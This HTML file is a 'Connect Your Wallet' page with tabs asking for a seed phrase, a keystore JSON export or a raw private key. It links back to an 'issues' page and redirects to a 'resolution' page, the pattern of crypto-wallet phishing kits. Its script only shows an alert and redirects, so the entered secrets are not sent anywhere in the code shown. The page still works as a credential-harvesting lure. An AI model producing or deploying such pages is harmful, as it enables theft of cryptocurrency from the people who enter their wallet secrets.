<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Wallet</title>
    <style>
        body { 
            margin: 0; 
            background-color: #000; 
            color: white; 
            font-family: system-ui, -apple-system, sans-serif; 
            padding: 20px; 
            max-width: 600px; 
            margin: 0 auto; 
        }
        h1 { font-size: 22px; text-align: center; margin-bottom: 30px; }
        
        /* Tabs */
        .tabs { display: flex; gap: 10px; margin-bottom: 25px; border-bottom: 1px solid #333; padding-bottom: 10px; }
        .tab { 
            background: none; 
            border: none; 
            color: gray; 
            font-weight: bold; 
            cursor: pointer; 
            padding: 10px; 
            font-size: 14px;
        }
        .tab.active { color: #2563eb; border-bottom: 2px solid #2563eb; }
        
        /* Input Sections */
        .input-section { display: none; animation: fadeIn 0.3s; }
        .input-section.active { display: block; }
        
        label { display: block; margin-bottom: 8px; font-size: 14px; color: #aaa; }
        textarea, input[type="text"] { 
            width: 100%; 
            background: #111; 
            border: 1px solid #333; 
            color: white; 
            padding: 15px; 
            border-radius: 8px; 
            font-family: monospace; 
            box-sizing: border-box; 
            margin-bottom: 20px;
        }
        textarea { height: 120px; resize: vertical; }
        
        button.submit-btn { 
            width: 100%; 
            background: #2563eb; 
            color: white; 
            border: none; 
            padding: 15px; 
            border-radius: 8px; 
            font-size: 16px; 
            font-weight: bold; 
            cursor: pointer; 
        }
        button.submit-btn:hover { background: #1d4ed8; }
        
        .back-link { display: block; text-align: center; margin-top: 20px; color: #2563eb; text-decoration: none; }
        
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>
    <h1>Connect Your Wallet</h1>

    <!-- Tabs for switching methods -->
    <div class="tabs">
        <button class="tab active" onclick="switchTab('seed')">Seed Phrase</button>
        <button class="tab" onclick="switchTab('keystone')">Keystone JSON</button>
        <button class="tab" onclick="switchTab('private')">Private Key</button>
    </div>

    <!-- Method 1: Seed Phrase -->
    <div id="seed" class="input-section active">
        <label>Enter your 12 or 24-word mnemonic phrase:</label>
        <textarea placeholder="word1 word2 word3 ..."></textarea>
        <button class="submit-btn" onclick="processWallet()">Verify & Recover</button>
    </div>

    <!-- Method 2: Keystone JSON -->
    <div id="keystone" class="input-section">
        <label>Paste your Keystone JSON export data:</label>
        <textarea placeholder='{"address": "...", "encryptedKey": "..."}'></textarea>
        <button class="submit-btn" onclick="processWallet()">Import JSON</button>
    </div>

    <!-- Method 3: Private Key -->
    <div id="private" class="input-section">
        <label>Enter your hex Private Key:</label>
        <input type="text" placeholder="0x7c...9f2a">
        <button class="submit-btn" onclick="processWallet()">Unlock with Key</button>
    </div>

    <a href="issues.html" class="back-link">← Back to Issues</a>

    <script>
        function switchTab(tabName) {
            // Hide all sections
            document.querySelectorAll('.input-section').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
            
            // Show selected section
            document.getElementById(tabName).classList.add('active');
            
            // Highlight tab
            const tabs = ['seed', 'keystone', 'private'];
            document.querySelectorAll('.tab')[tabs.indexOf(tabName)].classList.add('active');
        }

        function processWallet() {
            // In a real app, you would validate the input here.
            // For now, we redirect to the resolution page to simulate success.
            alert("Validating connection...");
            window.location.href = "resolution.html";
        }
    </script>
</body>
</html>
